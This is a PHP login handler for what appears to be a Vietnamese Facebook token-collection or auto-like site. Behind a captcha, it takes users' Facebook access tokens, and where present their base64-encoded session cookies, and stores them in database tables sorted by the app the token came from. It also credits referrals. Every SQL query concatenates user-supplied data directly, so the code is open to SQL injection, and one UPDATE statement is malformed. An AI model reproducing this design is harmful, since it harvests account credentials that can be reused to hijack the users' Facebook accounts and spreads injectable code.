<?php 
ob_start(); 
session_start();  
require("../_cnF/_star_cn_F.php"); 
require("../_cnF/_star_funC.php"); 
if (($_POST) && isset($_SESSION['captcha']) && isset($_POST['captcha'])){
	$token = $_GET['access_token'] ? $_GET['access_token'] : $_SESSION['ses_token'];
	$me = me($token);
	$tk = checktk($token);
 if($_SESSION['captcha'] !== $_POST['captcha']){
	$erros = "Sai Mã Captcha, Vui Lòng Nhập Lại.";
 }
 else if((ereg('@tfbnw.net',$me['email']))||(ereg('CAAC',$token))){
	$erros = "Không Sử Dụng Token Ảo Để Đăng Nhập.";
 }
 else if(!$me['mobile_phone']){
	 $erros = "Vui Lòng Cập Nhật Số Điện Thoại Để Đăng Nhập.";
 }else{
    $cookie = $_SESSION['ses_cookie']; 
    if ($me['id']){ 
    $_SESSION['idfb'] = $me['id']; 
    $_SESSION['ten'] = $me['name']; 
    $_SESSION['ngaysinh'] = $me['birthday']; 
    $_SESSION['email'] = $me['email']; 
    if($me['gender'] == 'male'){ 
    $_SESSION['gioitinh']='Nam';} 
    else{$_SESSION['gioitinh']='N&#7919;';} 
    $_SESSION['username'] = $me['username']; 
    $_SESSION['sdt'] = $me['mobile_phone']; 
    $_SESSION['matoken'] = $token; 

    if($_SESSION['ref']){ 
    $gt = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM `gioithieu` WHERE `idfb` = '".$_SESSION['idfb']."'"); 
    if(mysqli_num_rows($gt) < 1) { 
    mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO gioithieu SET `idfb`='".$me['id']."',`ten`='".$me['name']."', `tengt` = '".$_SESSION['refn']."', `idgt` = '".$_SESSION['ref']."'"); 
    mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE taikhoan SET `vnd` = `vnd`+1000,`luotgioithieu` = `luotgioithieu`+1 WHERE `idfb` = ".$_SESSION['ref'].""); 
    }else{ 
    echo "Null."; 
    }             
    }            
    $star = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM `taikhoan` WHERE `idfb` = $_SESSION[idfb]"); 
    if(mysqli_num_rows($star) < 1){ 
        $time = time(); 
        mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO taikhoan SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `time` = '" . $time . "', `vnd` = '5000' "); 
    } 

        $rows = null; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenvip WHERE idfb = '" . $me['id'] . "'"); 
        if($result){ 
        $rows = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
        if(mysqli_num_rows($result) > 1){ 
        mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenvip WHERE idfb='" . $me['id'] . "' "); 
        } 
        } 
        if(!$rows){ 
        mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenvip SET `idfb` = '" . $me['id'] . "',`ten` = '" . $me['name'] . "',`token` = '" . $token . "'"); 
        } else { 
        mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenvip SET `token` = '" . $token . "',  WHERE `id` = " . $rows['id'] . ""); 
    } 
    if($tk['id'] == '165907476854626'){ 
    $row = null; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenios WHERE idfb = '" . $me[id] . "' "); 
    if($result){ 
    $row = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
    if(mysqli_num_rows($result) > 1){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenios WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' "); 
    } 
    } 
    if(!$row){ 
        if($cookie){ 
            mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "', `cookie` = '".base64_encode($cookie)."'");
        } 
        else{ 
            mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenios SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' "); 
        } 
    }else{ 
        if($cookie){ 
            mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenios SET `token` = '" . $token . "', `cookie` = '".base64_encode($cookie)."' WHERE `id` = " . $row['id'] . " "); 
        } 
        else{ 
            mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenios SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " "); 
        } 
    } 
    ((is_null($___mysqli_res = mysqli_close($connection))) ? false : $___mysqli_res); 
    header("Location: /trangchu.html"); 
    } 
    if($tk['id'] == '41158896424'){ 
    $row = null; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenhtc WHERE idfb = '" . $me[id] . "' "); 
    if($result){ 
    $row = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
    if(mysqli_num_rows($result) > 1){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenhtc WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' "); 
        } 
    } 
    if(!$row){ 
        if($cookie){ 
            mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "', `cookie` = '".base64_encode($cookie)."'");
        } 
        else{ 
            mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenhtc SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' "); 
        } 
    }else{ 
        if($cookie){ 
            mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenhtc SET `token` = '" . $token . "', `cookie` = '".base64_encode($cookie)."' WHERE `id` = " . $row['id'] . " "); 
        } 
        else{ 
            mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenhtc SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " "); 
        } 
    } 
    ((is_null($___mysqli_res = mysqli_close($connection))) ? false : $___mysqli_res); 
    header("Location: /trangchu.html"); 
    } 
    if($tk['id'] == '6628568379'){ 
    $row = null; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokeniphone WHERE idfb = '" . $me[id] . "' "); 
    if($result){ 
    $row = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
    if(mysqli_num_rows($result) > 1){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokeniphone WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' "); 
    } 
    } 
    if(!$row){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokeniphone SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' "); 
    }else{ 
    mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokeniphone SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " "); 
    } 
    ((is_null($___mysqli_res = mysqli_close($connection))) ? false : $___mysqli_res); 
    header("Location: /trangchu.html"); 
    } 
    if($tk['id'] == '350685531728'){ 
    $row = null; 
    $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM tokenandroid WHERE idfb = '" . $me[id] . "' "); 
    if($result){ 
    $row = mysqli_fetch_array($result,  MYSQLI_ASSOC); 
    if(mysqli_num_rows($result) > 1){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM tokenandroid WHERE idfb='" . $me[id] . "' AND id != '" . $row['id'] . "' "); 
    } 
    } 
    if(!$row){ 
    mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO tokenandroid SET `idfb` = '" .$me[id]. "', `ten` = '" . $me[name] . "', `token` = '" .$token. "' "); 
    }else{ 
    mysqli_query($GLOBALS["___mysqli_ston"], "UPDATE tokenandroid SET `token` = '" . $token . "' WHERE `id` = " . $row['id'] . " "); 
    } 
    ((is_null($___mysqli_res = mysqli_close($connection))) ? false : $___mysqli_res); 
    header("Location: /trangchu.html"); 
    }else{ 
	$erros = "Chỉ Chấp Nhận Token Lấy Từ Hệ Thống";
	}
	}else{
	$erros = "Token Không Có Quyền Truy Cập. Vui Lòng Lấy Lại Token";
    } 
    } 
} 
if ($_GET['access_token'] ||  $_SESSION['ses_token']) { 
?> 
<?php 
require('../incfiles/header.php'); 
?> 
<div class="col-md-12"> 
<div class="box box-success"> 
<div class="box-title box-header with-border"> 
<h4><i class="fa fa-key"></i> Nhập Captcha Để Tiếp Tục</h4> 
</div> 
<div class="box-body"> 
<? if($erros) 
echo'<div class="col-md-12"> 
<div class="alert alert-danger"> 
<h4 style="text-align:center;">'.$erros.'</h4> 
</div></div>'; 
?> 
<div class="col-md-12"> 
<form action="" method= "POST"> 
<center> 
<div class="input-group"> 
<span class="input-group-btn" data-toggle="tooltip" data-placement="bottom"> 
<a class="dlChangeCaptcha"><img src="login/captcha.php"></a> 
</span> 
<input name="captcha" class="form-control" placeholder="Enter Captcha Text"> 
</div> 
<br/> 
<button type="submit" class="btn btn-warning" name="submit"><i class="fa fa-dot-circle-o"></i> Tiếp Tục</button> 
</center> 
</form> 
</div> 
</div> 
</div> 
</div> 
<?php 
require('../incfiles/footer.php');     
} 
?> 